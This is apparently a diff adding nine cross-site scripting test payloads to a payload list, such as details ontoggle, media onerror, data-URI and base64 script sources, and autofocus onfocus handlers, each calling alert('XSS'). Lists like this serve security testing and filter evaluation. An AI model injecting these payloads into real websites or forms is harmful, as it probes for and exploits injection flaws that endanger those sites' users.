@@ -24,4 +24,13 @@
 "><svg/onload=alert(8)>
 <math><mi//xlink:href="javascript:alert(9)">
 <body onload=alert(10)>
+<details open ontoggle=alert('XSS')>
+<details open ontoggle="alert('XSS')"><summary>Toggle</summary></details>
+<video src=x autoplay onerror=alert('XSS')></video>
+<audio src=x autoplay onerror=alert('XSS')></audio>
+<svg xmlns="http://www.w3.org/2000/svg" onload=alert('XSS')></svg>
+<script src="data:text/javascript,alert('XSS')"></script>
+<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>
+<textarea autofocus onfocus="alert('XSS');">X</textarea>
+<select autofocus onfocus="alert('XSS');"><option>1</option></select>
 
